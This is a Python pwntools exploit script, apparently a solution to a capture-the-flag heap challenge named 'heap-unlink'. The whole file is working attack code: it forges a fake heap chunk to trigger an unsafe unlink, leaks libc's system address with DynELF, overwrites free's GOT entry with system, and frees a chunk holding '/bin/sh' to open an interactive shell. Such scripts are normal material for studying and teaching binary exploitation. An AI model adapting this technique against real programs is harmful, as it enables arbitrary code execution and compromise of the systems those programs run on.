#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

p = process("./heap-unlink")

start = 0x8049d60 #start=&buf
free_got = 0x8049ce8

flag = 0
def leak(addr):
    data = "A" * 0xc + p32(start-0xc) + p32(addr)
    global flag
    if flag == 0:
        set_chunk(0, data)
        flag = 1
    else:
        set_chunk2(0, data)
    data = ""
    p.recvuntil('5.Exit\n')
    data = print_chunk(1)
    print("leaking: %#x ---> %s" % (addr, data[0:4].encode('hex')))
    return data[0:4]

def add_chunk(len):
    print p.recvuntil('\n')
    p.sendline('1')
    print p.recvuntil('Input the size of chunk you want to add:')
    p.sendline(str(len))

def set_chunk(index,data):
    p.recvuntil('5.Exit\n')
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def set_chunk2(index, data):
    p.sendline('2')
    p.recvuntil('Set chunk index:')
    p.sendline(str(index))
    p.recvuntil('Set chunk data:')
    p.sendline(data)

def del_chunk(index):
    p.recvuntil('\n')
    p.sendline('3')
    p.recvuntil('Delete chunk index:')
    p.sendline(str(index))

def print_chunk(index):
    p.sendline('4')
    p.recvuntil('Print chunk index:')
    p.sendline(str(index))
    res = p.recvuntil('5.Exit\n')
    return res




add_chunk(80)  #0
add_chunk(80)  #1
add_chunk(80)  #2
add_chunk(80)  #3
set_chunk(3, '/bin/sh')

#fake_chunk
payload = ""
payload += p32(0) + p32(81) + p32(start-12) + p32(start-8)
payload += "A"*(80-4*4)
payload += p32(80) + p32(88)

set_chunk(0,payload)

del_chunk(1)

#leak system_addr
pwn_elf = ELF('./heap-unlink')
d = DynELF(leak, elf=pwn_elf)
sys_addr = d.lookup('system', 'libc')
print("system addr: %#x" % sys_addr)

data = "A" * 12 + p32(start-12) + p32(free_got)
set_chunk2('0', data)

set_chunk2('1', p32(sys_addr))

del_chunk('3')
p.interactive()
p.close()
